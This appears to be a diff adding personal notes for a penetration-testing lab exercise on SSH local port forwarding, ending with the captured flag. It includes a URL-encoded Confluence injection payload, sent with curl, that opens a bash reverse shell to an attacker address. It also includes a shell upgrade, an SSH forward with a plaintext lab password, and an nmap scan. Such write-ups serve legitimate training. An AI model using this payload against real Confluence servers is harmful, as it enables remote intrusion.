@@ -1,0 +1,46 @@
+Questions 2
+Start VM Group 2. A server is running on HRSHARES port 4242. Download the ssh_local_client binary from http://CONFLUENCE01:8090/exercises/ssh_local_client. Create an SSH local port forward on CONFLUENCE01, which will let you run the ssh_local_client from your Kali machine against the server on HRSHARES and retrieve the flag.
+
+Note: the source files used to build the ssh_local_client binary can be downloaded from /exercises/client_source.zip.
+
+HINT
+Enable Python's pty module after getting a shell on Confluence.
+Set up port forwarding as in Listing 20, changing the port to 4242 and IP.
+Download ssh_local_client via browser.
+Use the -h argument for help if issues arise with the binary.
+
+# Download the ssh_local_client file
+wget http://192.168.155.63:8090/exercises/ssh_local_client
+
+# Use msfconsole listen to port 4444
+curl -v http://192.168.155.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# You will get the shell after curl executed
+# Upgrade to TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Local Port Forwarding
+ssh -N -L 0.0.0.0:4455:172.16.155.217:4242 database_admin@10.4.155.215
+password:sqlpass123
+
+# Check the port 
+sudo nmap -sC -sV -p4455 192.168.155.63  
+...
+4455/tcp open  prchat-user?
+...
+
+# Use the exploit tools provide by questions
+./ssh_local_client -h   
+prat_server 0.1.0
+USAGE:
+    ssh_local_client [OPTIONS]
+OPTIONS:
+    -h, --help                 Print help information
+    -i, --ip-addr <IP_ADDR>    [default: 127.0.0.1]
+    -p, --port <PORT>          [default: 4141]
+    -V, --version              Print version information
+
+# Seems good, lets try the tools
+./ssh_local_client -i 192.168.155.63 -p 4455
+Connecting to 192.168.155.63:4455
+Flag: "OS{3e30249594a9f67eac81af2a943be5de}"
